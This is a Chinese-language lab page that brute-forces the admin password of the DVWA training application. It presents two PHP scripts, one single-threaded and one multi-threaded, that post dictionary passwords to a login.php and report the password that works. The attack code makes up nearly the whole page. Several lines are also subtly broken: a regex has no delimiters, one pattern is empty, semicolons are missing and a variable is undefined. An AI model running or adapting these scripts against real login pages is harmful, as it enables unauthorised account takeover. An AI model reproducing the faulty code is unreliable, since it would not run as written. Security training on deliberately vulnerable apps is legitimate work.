# 破解DVWA-admin密码



{% tabs %}
{% tab title="单线程" %}
单线程脚本如下：

```php
<?php
// 检测程序有无开启curl，若无，提示开启
if(!extension_loaded('curl')){exit("please open curl,THANKS!");}

//使用 file() 函数把字典文件 pass.txt 读入到数组 password 中
$password = file(pass.txt);

// 指定测试的URL
$url = 'http://192.168.100.60/login.php';

// 使用foreach()函数遍历数组
foreach($password as $pass){
	$pass = trim($pass);

	// 设置post数据，用户名为admin，密码为字典文件里的密码与login按钮
	$post = "username=admin&password=$pass&Login=%E7%99%BB%E9%99%86";
	
	// 初始化名为 ch 的CURL会话
	$ch = curl_init();

	// 设置CURL传输选项
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_HEADER,1);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch,CURLOPT_POSTFIELDS,$post);

	// curl_exec() 执行一个会话
	$data = curl_exec($ch);

	// 关闭curl会话
	curl_close($ch);
	if(preg_match('login.php/i',$data)){
		// 输出破解过程中的信息
		echo 'NOW password is:'.$pass."\n";
	}else{

		// 成功破解密码后停止破解并输入信息
		echo 'hello,your password is:'.$pass."\n";
		exit;
	}
}
?>
```
{% endtab %}

{% tab title="多线程" %}
多线程脚本如下：

```php
<?php

error_reporting(7);

// 记录脚本开始运行的时间，便于后面计算脚本运算时间
$start_time = func_time();

if(!extension_loaded('curl')){exit("please open curl,THANKS!");}

// 载入多线程类
require_once('RollingCurl.php');

// 线程数
$threads = 50;

// 超时时间
$timeout = 0.5;
$dicfile = 'pass.txt';

// 使用file()函数把字典文件读取到数组dict中
$dict = file($dicfile);

// 自定义函数dvwa_crack
function dvwa_crack($response,$info,$request){
	if($info['http_code']!=200){
		exit('please jiancha wangluo,thanks!'.PHP_EOL);
	}
	$p = $request->post_data;
	preg_match('/username\=(.*?)&password\=(.*?)&Login\=%E7%99%BB%E9%99%86/i',$p,$mm);
	$user = $mm[1];
	$pass = $mm[2];
	if(!preg_match('',$response,$match)){
		echo '密码破解失败 '.'用户名：'.$user.'密码：'.$pass.PHP_EOL;
	}else{
		echo '密码破解成功 '.'用户名：'.$user.'密码：'.$pass.chr(07).PHP_EOL;
		file_put_contents('result.txt','密码破解成功 '.'用户名：'.$user.'密码：'.$pass.PHP_EOL);
	}
}

// 指定测试的URL
$url = 'http://192.168.1.1/login.php';

// 要破解的用户名
$user = 'admin'

$rc = new rollingcurl('dvwa_crack');

// 设置线程
$rc -> __set('window_size',$threads);

// 设置超时时间
$rc -> __set('time_out',$timeout);
// echo $rc -> __set('window_size');

// 使用foreach()函数遍历数组，循环进行破解
foreach ($dict as $pass){
	// 去掉多余字符
	$pass = trim($pass)
	$post_data = "username=admin&password=$pass&Login=%E7%99%BB%E9%99%86";
	$request = new rollingcurlrequest($url,$method,$post_data);
	$request -> options =array(
		//CURLOPT_HEADER 显示 HTTP 头信息 CURLOPT_NOBODY 不显示 BODY 体
		CURLOPT_HEADER => 1,
		CURLOPT_NOBODY => 1
	);
	$rc -> add($request);
}
$rc -> execute();

// 时间统计函数
function func_time(){
	list($microsec, $sec) = explode('',microtime());
	return $microsec + $sec;
}
echo '脚本执行时间： ' . round((func_time() - $start_time),4) . '秒。';
?>
```

ending
{% endtab %}
{% endtabs %}





